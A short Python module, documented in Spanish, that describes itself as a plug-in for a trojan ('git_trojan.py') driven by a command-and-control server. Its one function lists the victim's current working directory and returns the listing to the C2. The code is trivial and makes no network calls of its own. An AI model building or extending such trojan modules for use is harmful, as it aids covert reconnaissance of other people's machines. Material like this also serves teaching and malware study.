"""
dirlister.py - Módulo de troyano: listar directorio actual
===========================================================
Módulo pensado para ser cargado dinámicamente por un troyano
(p. ej. git_trojan.py). Expone una función `run(**args)` que lista
el contenido del directorio de trabajo actual y devuelve el resultado
como cadena de texto.

El C2 llama a `sys.modules[module].run()` para ejecutarlo; la firma
`**args` permite pasar parámetros opcionales sin romper la interfaz.

REQUISITOS:
    - Python 3.x (solo biblioteca estándar)

EJEMPLOS DE EJECUCIÓN:
    python -c "import dirlister; print(dirlister.run())"
"""

import os


def run(**args):
    """
    Lista los ficheros y directorios del directorio de trabajo actual.

    Args:
        **args: Parámetros opcionales (ignorados; mantienen la interfaz
                genérica del protocolo de módulos del troyano).

    Returns:
        str: Representación en cadena de la lista de entradas del directorio.
    """
    print("[*] En el módulo dirlister.")
    files = os.listdir(".")
    return str(files)
